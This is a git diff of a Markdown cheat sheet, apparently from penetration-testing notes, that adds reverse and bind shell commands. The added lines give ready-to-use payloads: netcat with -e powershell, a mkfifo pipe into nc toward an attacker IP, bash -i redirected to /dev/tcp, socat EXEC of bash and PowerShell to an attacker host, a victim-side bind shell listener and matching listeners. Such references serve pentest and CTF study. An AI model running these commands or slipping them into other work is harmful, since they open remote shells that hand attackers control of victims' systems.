@@ -1,10 +1,59 @@
+---
+layout:
+  width: wide
+  title:
+    visible: true
+  description:
+    visible: false
+  tableOfContents:
+    visible: true
+  outline:
+    visible: true
+  pagination:
+    visible: true
+  metadata:
+    visible: false
+---
+
 # Reverse Shell and Bind Shell Commands
 
-### Using Netcat
+### Netcat Reverse Shell
 
-Basic listener: `sudo nc -lnvp <PORT>`
+Reverse Shell Payload:&#x20;
 
-Netcat Shell Stabilization:
+```bash
+## Windows
+nc.exe 10.10.10.10 9001 -e powershell
+
+## Linux
+    ## nc mkfifo
+    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc <ATTACKER-IP> 9001 >/tmp/f
+
+    ## Bash -i
+    /bin/bash -i >& /dev/tcp/<ATTCKER-IP>/9001 0>&1
+```
+
+Basic listener:&#x20;
+
+```bash
+sudo nc -lnvp <PORT>
+```
+
+### Netcat Bind Shell
+
+Bind Shell Payload (Listener) for victim:
+
+```bash
+rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9001 > /tmp/f
+```
+
+Attacker run this command to get shell:
+
+```bash
+nc VICTIM_IP 9001
+```
+
+### Netcat Shell Stabilization:
 
 ```bash
 sudo nc -lnvp <PORT>
@@ -27,17 +76,26 @@ stty raw -echo; fg
 
 ***
 
-### Using Socket
+### Socket Reverse Shell
 
-Basic Listener: `socat -d -d TCP-LISTEN:<PORT> STDOUT`
+Reverse Shell Payloads:&#x20;
 
-On Windows we use this command to connect back:
-
-```powershell
+```ps
+## Windows
 socat TCP:<LOCAL-IP>:<LOCAP-PORT> EXEC:powershell.exe, pipes
+## The pipes option is used to force PowerShell (or cmd.exe) to use Unix style standard input and output. 
+
+## Linux
+socat TCP:10.10.10.10:9001 EXEC:/bin/bash
 ```
 
-> The `pipes` option is used to force PowerShell (or cmd.exe) to use Unix style standard input and output.&#x20;
+Basic Listener:&#x20;
+
+```bash
+socat -d -d TCP-LISTEN:<PORT> STDOUT
+```
+
+
 
 The equivalent command for Linux target:
 
